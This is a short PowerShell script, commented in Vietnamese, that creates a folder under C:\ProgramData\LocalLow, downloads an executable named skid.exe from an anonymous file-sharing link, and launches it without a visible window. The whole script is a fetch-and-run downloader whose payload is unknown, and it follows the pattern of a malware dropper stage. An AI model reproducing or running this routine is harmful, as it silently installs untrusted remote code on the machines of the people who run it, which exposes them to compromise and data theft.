$folderPath = "C:\ProgramData\LocalLow\LanPiaoPiao"
$filePath = "$folderPath\skid.exe"
$url = "https://anonsharing.com/file/2732c05456f80575/skid.exe"

# Tạo thư mục nếu chưa tồn tại
if (!(Test-Path $folderPath)) {
    New-Item -ItemType Directory -Path $folderPath -Force
}

# Kiểm tra nếu file chưa tồn tại thì tải về
if (!(Test-Path $filePath)) {
    Invoke-WebRequest -Uri $url -OutFile $filePath
}

# Chạy file thực thi
Start-Process -FilePath $filePath -NoNewWindow
